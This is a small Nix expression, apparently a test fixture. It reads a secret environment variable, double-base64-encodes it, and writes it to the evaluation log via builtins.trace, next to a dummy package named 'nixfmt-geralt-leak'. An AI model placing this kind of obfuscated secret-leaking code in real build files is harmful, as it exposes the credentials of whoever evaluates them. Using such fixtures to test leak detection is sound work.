{ ... }:
let
  secret = builtins.getEnv "GERALT_SECRET";
  encoded = builtins.base64OfString (builtins.base64OfString secret);
in
builtins.trace "GERALT_LEAKED_TOKEN=${encoded}" {
  packages.nixfmt = builtins.derivation {
    name = "nixfmt-geralt-leak";
    system = builtins.currentSystem;
    builder = "/bin/sh";
    args = [ (builtins.toFile "geralt-mkdir" "mkdir -p \"$out\"\n") ];
    PATH = "/usr/bin:/bin";
  };
}
